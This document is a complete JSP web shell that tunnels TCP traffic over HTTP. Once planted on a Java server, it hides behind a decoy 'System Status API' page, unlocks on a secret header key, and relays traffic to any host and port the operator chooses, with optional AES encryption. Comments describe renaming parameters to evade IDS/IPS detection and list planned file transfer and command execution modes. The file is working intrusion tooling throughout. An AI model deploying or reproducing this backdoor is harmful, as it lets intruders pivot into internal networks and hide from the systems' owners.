<%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%><%!

final public static char[] hexArray = "0123456789ABCDEF".toCharArray();

class SessionConnection
{
	public String ConnectionID;
	public int PortNumber;
	public String Host;
	public Socket Sock;
	public int UnusedIterations;
	public byte[] ReceiveBuffer;
	
	public SessionConnection()
	{
		ConnectionID = GenerateConnectionID();
		PortNumber = -1;
		Host = "";
		UnusedIterations = 0;
		ReceiveBuffer = new byte[0];
	}
	
	public void AddBytesToReceiveBuffer(byte[] newBytes)
	{
		if (newBytes.length > 0)
		{
			byte[] newReceiveBuffer = new byte[ReceiveBuffer.length + newBytes.length];
			System.arraycopy(ReceiveBuffer, 0, newReceiveBuffer, 0, ReceiveBuffer.length);
			System.arraycopy(newBytes, 0, newReceiveBuffer, ReceiveBuffer.length, newBytes.length);
			ReceiveBuffer = newReceiveBuffer;
		}
	}
	
	public byte[] GetBytesFromReceiveBuffer(int maxBytes)
	{
		int byteCount = maxBytes;
		if (byteCount > ReceiveBuffer.length)
		{
			byteCount = ReceiveBuffer.length;
		}
		byte[] result = new byte[byteCount];
		
		System.arraycopy(ReceiveBuffer, 0, result, 0, byteCount);
		
		if (byteCount == ReceiveBuffer.length)
		{
			ReceiveBuffer = new byte[0];
		}
		else
		{
			int newByteCount = ReceiveBuffer.length - byteCount;
			byte[] newReceiveBuffer = new byte[newByteCount];
			System.arraycopy(ReceiveBuffer, byteCount, newReceiveBuffer, 0, newByteCount);
			ReceiveBuffer = newReceiveBuffer;
		}
		return result;
	}
	
	public String GenerateConnectionID()
	{	
		Random r = new Random();
		
		byte[] connID = new byte[8];
		
		r.nextBytes(connID);
		
		return bytesToHex(connID);
	}
	
	public String bytesToHex(byte[] bytes)
	{
		char[] hexChars = new char[bytes.length * 2];
		for ( int j = 0; j < bytes.length; j++ )
		{
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = hexArray[v >>> 4];
			hexChars[j * 2 + 1] = hexArray[v & 0x0F];
		}
		return new String(hexChars);
	}
}

public byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                             + Character.digit(s.charAt(i+1), 16));
    }
    return data;
}

public byte[] GenerateRandomBytes(int byteCount)
{
	byte[] result = new byte[byteCount];
	new Random().nextBytes(result);
	return result;
}

public byte[] EncryptData(byte[] plainText, Cipher c, byte[] key, int blockSize) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
{
	byte[] iv = GenerateRandomBytes(blockSize);
	// typical AES encryption depends on the IV alone preventing identical inputs from 
	// encrypting to identical outputs
	// MIT Kerberos uses a model in which the IV is set to all zeroes, but the first 
	// block of data is random, and then discarded on decryption
	// I think of this as a "reinitialization vector" that takes place on the other 
	// side of the encryption "looking glass". It should also help protect against 
	// theoretical known-plaintext vulnerabilities in AES.
	// why not use both? 
	byte[] reIV = GenerateRandomBytes(blockSize);
	SecretKey key2 = new SecretKeySpec(key, 0, key.length, "AES");
	c.init(Cipher.ENCRYPT_MODE, key2, new IvParameterSpec(iv));
	byte[] rivPlainText = new byte[plainText.length + blockSize];
	System.arraycopy(reIV, 0, rivPlainText, 0, reIV.length);
	System.arraycopy(plainText, 0, rivPlainText, blockSize, plainText.length);
	byte[] cipherText = c.doFinal(rivPlainText);
	byte[] ivCipherText = new byte[cipherText.length + blockSize];
	System.arraycopy(iv, 0, ivCipherText, 0, iv.length);
	System.arraycopy(cipherText, 0, ivCipherText, blockSize, cipherText.length);	
	return ivCipherText;
}

public byte[] DecryptData(byte[] cipherText, Cipher c, byte[] key, int blockSize) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
{
	byte[] iv = new byte[blockSize];
	byte[] strippedCipherText = new byte[cipherText.length - blockSize];
	System.arraycopy(cipherText, 0, iv, 0, blockSize);
	System.arraycopy(cipherText, blockSize, strippedCipherText, 0, strippedCipherText.length);
	SecretKey key2 = new SecretKeySpec(key, 0, key.length, "AES");
	c.init(Cipher.DECRYPT_MODE, key2, new IvParameterSpec(iv));
	byte[] rivPlainText = c.doFinal(strippedCipherText);
	byte[] plainText = new byte[rivPlainText.length - blockSize];
	System.arraycopy(rivPlainText, blockSize, plainText, 0, plainText.length);
	return plainText;
}

%><%

/* Begin configurable options */

int serverSocketMaxUnusedIterations = 1000;

int serverSocketIOTimeout = 10;
int serverSocketSendBufferSize = 6553600;
int serverSocketReceiveBufferSize = 6553600;

int serverToClientBlockSize = 32768;

/* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
/* If they are altered, be sure to pass the corresponding alternate values to the Python client software */

String headerValueKey = "y/hn4W9FtBpNo9mprLJ0th/v";
String encryptionKeyHex = "780d568f96c214a001384a94baf45598";

String headerNameKey = "x-impresario-reload-prescribes";

String accessKeyMode = "header";
String paramNameAccessKey = "ReverseHammers";

String paramNameOperation = "visioningDenies";
String paramNameDestinationHost = "RuntThaws";
String paramNameDestinationPort = "EntertainSignifying";
String paramNameConnectionID = "ElusivenessShuffleboard";
String paramNameData = "moleskinUnimpressed";
String paramNamePlaintextBlock = "signifyRedbreasts";
String paramNameEncryptedBlock = "nigglesSteals";

String dataBlockNameValueSeparatorB64 = "Bw==";
String dataBlockParamSeparatorB64 = "HQ==";

String opModeStringOpenConnection = "anybodiesDefies";
String opModeStringSendReceive = "telecommunicationsLionhearted";
String opModeStringCloseConnection = "SemaphoresCapacious";

String responseStringHide = "240ada1df87bbfec45f70fecf431efb404d9138307de1fae9e6554c6f5c527fe9f25cc/847f7655c7300fc9d1fa643d76ac898e";
String responseStringConnectionCreated = "e3e19543da27d00590b8a9db28d4e7c2ebeaad0b@aa2ceb40d9c99b531a5256eb4462d8d473533f6b3bb447d001";
String responseStringConnectionClosed = "d2388c0af5e520d22c&912d98a94732432efa";
String responseStringData = "0df48a6f598bb312164a&e7c52ba908621bcc3450ab869bf26a4878cb1fff91eab3772fe3dea6";
String responseStringNoData = "65b1ca-ad";
String responseStringErrorGeneric = "70c100035f046b9501361d4ac33d4622af875334fe0402d825d1998af0c465cdba28e88652febe42fc41";
String responseStringErrorInvalidRequest = "0bdbdaaeab84ec522f80a0ff4060641ba58410ffcf35af12656b2ba2167c80";
String responseStringErrorConnectionNotFound = "18c57aca3d82e48f22d7c158064e1eb5af8e4399a352f661f340a4";
String responseStringErrorConnectionOpenFailed = "5b06bcd66d6ffb1a2af8c66df7ec5fecd5f4fafc5ab4510e08$a7fb87d61df85af183985b5eed2537f3fafd";
String responseStringErrorConnectionCloseFailed = "85654ef6dce65ec2bf874116b6466c7e84f89af0ae76b2@00a98ca3063b9bb83389693ca8129b423347fabad39293ef9e1671";
String responseStringErrorConnectionSendFailed = "377681882f17198dd344ad72716cef581132f81b499744";
String responseStringErrorConnectionReceiveFailed = "9c4e5d0177eb233b8551";
String responseStringErrorDecryptFailed = "3788af53937927a552a1362bd5a6450c6626ee58c5c8976e93e32a9a8af2f25d83cd0d.d7bcc20ed136653f2ffb8a9e08afd245e80baaf9d13a7fff493d93ccb782db19c3af05";
String responseStringErrorEncryptFailed = "9557905923bce9c58738f06ce50e8908b4c4c5b6|61bb25732e9ecd2ac485aa25371a80a0670828568c347555ea34c8";
String responseStringErrorEncryptionNotSupported = "40569f0da23cdecb96e0cf13889f574cf327263b$ee6265de1dc170e58cf0e067d4e8f2cf1b7a9a40a5ebab";
String responseStringPrefixB64 = "PGh0bWw+DQoJPGhlYWQ+DQoJCTx0aXRsZT5TeXN0ZW0gU3RhdHVzIEFQSTwvdGl0bGU+DQoJPC9oZWFkPg0KCTxib2R5Pg0KPHByZT4NCg==";
String responseStringSuffixB64 = "DQo8L3ByZT4NCgk8L2JvZHk+DQo8L2h0bWw+";

/* End configurable options */

BASE64Decoder base64decoder = new BASE64Decoder(); 

String responseStringPrefix = new String(base64decoder.decodeBuffer(responseStringPrefixB64));
String responseStringSuffix = new String(base64decoder.decodeBuffer(responseStringSuffixB64));

String dataBlockNameValueSeparator = new String(base64decoder.decodeBuffer(dataBlockNameValueSeparatorB64));
String dataBlockParamSeparator = new String(base64decoder.decodeBuffer(dataBlockParamSeparatorB64));

int OPMODE_HIDE = 0;
int OPMODE_DEFAULT = 1;
int OPMODE_OPEN = 2;
int OPMODE_SEND_RECEIVE = 4;
int OPMODE_CLOSE = 8;
/* To do: file upload/download, OS command execution */
int OPMODE_UPLOAD = 16;
int OPMODE_DOWNLOAD = 32;
int OPMODE_CMD_EXEC = 64;

int opMode = OPMODE_HIDE;

int encryptionBlockSize = 16;

/* response.setBufferSize(6553600); */

byte[] encryptionKey = new byte[] {};

try
{
	encryptionKey = hexStringToByteArray(encryptionKeyHex);
}
catch (Exception ex)
{
	encryptionKey = new byte[] {};
}

Cipher cipher = null;

try
{
	cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
}
catch (Exception ex)
{
	cipher = null;
}


try
{
	if (accessKeyMode.equals("header"))
	{
		if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))
		{
			opMode = OPMODE_DEFAULT;
		}
	}
	else
	{
		if (request.getParameter(paramNameAccessKey).toString().trim().equals(headerValueKey.trim()))
		{
			opMode = OPMODE_DEFAULT;
		}
	}
}
catch (Exception ex)
{
    opMode = OPMODE_HIDE;
}
%><%=responseStringPrefix%><%
if (opMode == OPMODE_HIDE)
{
	/* Begin: replace this block of code with alternate JSP code to use a different "innocuous" default response */
	/* E.g. copy/paste from your favourite server status page JSP */
    %><%=responseStringHide%><%
	/* End: replace this block of code with alternate JSP code to use a different "innocuous" default response */
}
if (opMode != OPMODE_HIDE)
{
	PageContext context;
	HttpSession currentSession;
	int DestPort = -1;
	String RequestedOp = "";
	String DestHost = "";
	String DataB64 = "";
	String ConnectionID = "";
	Hashtable Connections = new Hashtable();
	SessionConnection Conn = new SessionConnection();
	boolean encryptedRequest = false;
	String unpackedBlock = "";
	Hashtable unpackedParams = new Hashtable();
	boolean sentResponse = false;
	
	boolean validRequest = true;
	
	try
	{
		if ((request.getParameter(paramNameEncryptedBlock) != null) || (request.getParameter(paramNamePlaintextBlock) != null))
		{
			byte[] decodedBytes = new byte[0];
			if ((request.getParameter(paramNameEncryptedBlock) != null) && (cipher != null) && (encryptionKey.length > 0))
			{
				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNameEncryptedBlock));
				try
				{
					byte[] decryptedBytes = DecryptData(decodedBytes, cipher, encryptionKey, encryptionBlockSize);
					unpackedBlock = new String(decryptedBytes, "UTF-8");
					encryptedRequest = true;
				}
				catch (Exception ex)
				{
					%><%=responseStringErrorDecryptFailed%><%
					/* return; */
					validRequest = false;
					sentResponse = true;
				}
			}
			else
			{
				decodedBytes = base64decoder.decodeBuffer(request.getParameter(paramNamePlaintextBlock));
				unpackedBlock = new String(decodedBytes, "UTF-8");
			}
			
			if (validRequest)
			{
				String[] paramArray = unpackedBlock.split(dataBlockParamSeparator);
				if (paramArray.length > 0)
				{
					for (int i = 0; i < paramArray.length; i++)
					{
						String currentParam = paramArray[i];
						String[] pvArray = currentParam.split(dataBlockNameValueSeparator);
						if (pvArray.length > 1)
						{
							unpackedParams.put(pvArray[0], pvArray[1]);
						}
					}
				}
			}
		}
	}
	catch (Exception ex)
	{
		validRequest = false;
	}
	
	if (validRequest)
	{		
		try
		{
			if (unpackedParams.containsKey(paramNameOperation))
			{
				RequestedOp = (String)unpackedParams.get(paramNameOperation);
			}
		}
		catch (Exception ex)
		{
			RequestedOp = "";
		}
		
		try
		{
			if (unpackedParams.containsKey(paramNameDestinationHost))
			{
				DestHost = (String)unpackedParams.get(paramNameDestinationHost);
			}
		}
		catch (Exception ex)
		{
			DestHost = "";
		}

		try
		{
			if (unpackedParams.containsKey(paramNameConnectionID))
			{
				ConnectionID = (String)unpackedParams.get(paramNameConnectionID);
			}
		}
		catch (Exception ex)
		{
			ConnectionID = "";
		}
		
		try
		{
			if (unpackedParams.containsKey(paramNameDestinationPort))
			{
				DestPort = (Integer.parseInt((String)unpackedParams.get(paramNameDestinationPort)));
			}
		}
		catch (Exception ex)
		{
			DestPort = -1;
		}
		
		try
		{
			if (unpackedParams.containsKey(paramNameData))
			{
				DataB64 = (String)unpackedParams.get(paramNameData);
			}
		}
		catch (Exception ex)
		{
			DataB64 = "";
		}
		
		if (RequestedOp.equals(""))
		{
			validRequest = false;
		}
	}
	
	if (validRequest)
	{
		if (RequestedOp.equals(opModeStringOpenConnection))
		{
			opMode = OPMODE_OPEN;
			if (DestHost.equals(""))
			{
				validRequest = false;
			}
			if (DestPort == -1)
			{
				validRequest = false;
			}
		}
		if (RequestedOp.equals(opModeStringSendReceive))
		{
			opMode = OPMODE_SEND_RECEIVE;
			if (ConnectionID.equals(""))
			{
				validRequest = false;
			}
		}
		if (RequestedOp.equals(opModeStringCloseConnection))
		{
			opMode = OPMODE_CLOSE;
			if (ConnectionID.equals(""))
			{
				validRequest = false;
			}
		}
	}
	
	if (!validRequest)
	{
		if (!sentResponse)
		{
			%><%=responseStringErrorInvalidRequest%><%
			/* return; */
		}
	}
	else
	{
		try
		{
			Connections = (Hashtable)session.getAttribute("SessionConnections");
			if (Connections == null)
			{
				Connections = new Hashtable();
			}
		}
		catch (Exception ex)
		{
			Connections = new Hashtable();
		}
		
		if (opMode == OPMODE_OPEN)
		{
			Conn = new SessionConnection();
			Conn.Host = DestHost;
			Conn.PortNumber = DestPort;
			ConnectionID = Conn.ConnectionID;
			try
			{
				Conn.Sock = new Socket(DestHost, DestPort);
				Conn.Sock.setSoTimeout(serverSocketIOTimeout);
				Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
				Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
				/* Conn.Sock.setTcpNoDelay(true); */
				Connections.put(ConnectionID, Conn);
				%><%=responseStringConnectionCreated%> <%=ConnectionID%><%
				sentResponse = true;
			}
			catch (Exception ex)
			{
				%><%=responseStringErrorConnectionOpenFailed%><%
				/* return; */
				validRequest = false;
				sentResponse = true;
			}
		}
	}
	
	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE) || (opMode == OPMODE_CLOSE))
	{
		if (Connections.containsKey(ConnectionID))
		{
			try
			{
				Conn = (SessionConnection)Connections.get(ConnectionID);
				if (Conn.Sock == null)
				{
					validRequest = false;
					Connections.remove(ConnectionID);
				}
			}
			catch (Exception ex)
			{
				validRequest = false;
			}
		}
		else
		{
			validRequest = false;
		}
		
		if (!validRequest)
		{
			if (!sentResponse)
			{
				%><%=responseStringErrorConnectionNotFound%><%
				/* return; */
				validRequest = false;
				sentResponse = true;
			}
		}
	}

	if ((validRequest) && (opMode == OPMODE_SEND_RECEIVE))
	{
		InputStream is = null;
		try
		{
			is = Conn.Sock.getInputStream();
		}
		catch (Exception ex)
		{
			Conn.Sock = new Socket(DestHost, DestPort);
			Conn.Sock.setSoTimeout(serverSocketIOTimeout);
			Conn.Sock.setSendBufferSize(serverSocketSendBufferSize);
			Conn.Sock.setReceiveBufferSize(serverSocketReceiveBufferSize);
			/* Conn.Sock.setTcpNoDelay(true); */
			is = Conn.Sock.getInputStream();
		}
		DataInputStream inStream = new DataInputStream(is);
		DataOutputStream outStream = new DataOutputStream(Conn.Sock.getOutputStream());
		
		byte[] bytesOut = base64decoder.decodeBuffer(DataB64);
		
		boolean socketStillOpen = true;
		
		try
		{
			outStream.write(bytesOut);
			outStream.flush();
		}
		catch (Exception ex)
		{
			socketStillOpen = false;
			opMode = OPMODE_CLOSE;
		}
		
		byte[] bytesIn = new byte[0];
		
		if (socketStillOpen)
		{
			byte[] buf = new byte[6553600];
			int maxReadAttempts = 65536000;
			maxReadAttempts = 1000;
			int readAttempts = 0;
			int nRead = 0;
			boolean doneReading = false;
			try
			{
				nRead = inStream.read(buf);
				if (nRead < 0)
				{
					doneReading = true;
				}
			}
			catch (Exception ex)
			{
				doneReading = true;
			}
			while (!doneReading)
			{
				byte[] newBytesIn = new byte[bytesIn.length + nRead];
				if (bytesIn.length > 0)
				{
					System.arraycopy(bytesIn, 0, newBytesIn, 0, bytesIn.length);
				}
				if (nRead > 0)
				{
					System.arraycopy(buf, 0, newBytesIn, bytesIn.length, nRead);
					bytesIn = newBytesIn;
				}
				try
				{
					nRead = inStream.read(buf);
					if (nRead < 0)
					{
						doneReading = true;
					}
				}
				catch (Exception ex)
				{
					doneReading = true;
				}
				readAttempts++;
				if (readAttempts > maxReadAttempts)
				{
					doneReading = true;
				}
			}
			
			synchronized(session)
			{
				Conn.AddBytesToReceiveBuffer(bytesIn);
			}
		}
		
		if (Conn.ReceiveBuffer.length > 0)
		{
			String OutB64 = "";
			BASE64Encoder base64encoder = new BASE64Encoder();
			byte[] toClient = new byte[0];
			synchronized(session)
			{
				toClient = Conn.GetBytesFromReceiveBuffer(serverToClientBlockSize);
			}
			if (encryptedRequest)
			{
				try
				{
					byte[] encryptedBytes = EncryptData(toClient, cipher, encryptionKey, encryptionBlockSize);
					OutB64 = base64encoder.encode(encryptedBytes);
				}
				catch (Exception ex)
				{
					%><%=responseStringErrorEncryptFailed%><%
					/* return; */
					validRequest = false;
					sentResponse = true;
				}
			}
			else
			{
				OutB64 = base64encoder.encode(toClient);
			}
			if (!sentResponse)
			{
				%><%=responseStringData%> <%=OutB64%><%
				sentResponse = true;
			}
		}
		else
		{
			if (!sentResponse)
			{
				%><%=responseStringNoData%><%
				sentResponse = true;
			}
		}
	}
	
	if ((validRequest) && (opMode == OPMODE_CLOSE))
	{
		try
		{
			Conn.Sock.close();
			if (!sentResponse)
			{
				%><%=responseStringConnectionClosed%> <%=ConnectionID%><%
				sentResponse = true;
			}
		}
		catch (Exception ex)
		{
			if (!sentResponse)
			{
				%><%=responseStringErrorConnectionCloseFailed%><%
				sentResponse = true;
			}
		}
	}
	
	if (validRequest)
	{	
		synchronized(session)
		{
			try
			{
				Connections = (Hashtable)session.getAttribute("SessionConnections");
				if (Connections == null)
				{
					Connections = new Hashtable();
				}
			}
			catch (Exception ex)
			{
				Connections = new Hashtable();
			}
			
			/* Update the current connection (if one exists), and remove stale connections */
			
			if (!ConnectionID.equals(""))
			{
				Conn.UnusedIterations = 0;
				if (Connections.containsKey(ConnectionID))
				{
					Connections.remove(ConnectionID);
					if (opMode != OPMODE_CLOSE)
					{
						Connections.put(ConnectionID, Conn);
					}
				}
				else
				{
					Connections.put(ConnectionID, Conn);
				}
			}
			
			Enumeration connKeys = Connections.keys();
			while (connKeys.hasMoreElements())
			{
				String cid = (String)connKeys.nextElement();
				if (!cid.equals(ConnectionID))
				{
					SessionConnection c = (SessionConnection)Connections.get(cid);
					Connections.remove(cid);
					c.UnusedIterations++;
					if (c.UnusedIterations < serverSocketMaxUnusedIterations)
					{
						Connections.put(cid, c);
					}
					else
					{
						try
						{
							c.Sock.close();
						}
						catch (Exception ex)
						{
							// do nothing
						}
					}
				}
			}
			
			session.setAttribute("SessionConnections", Connections);
		}
	}
}
%><%=responseStringSuffix%><%
%>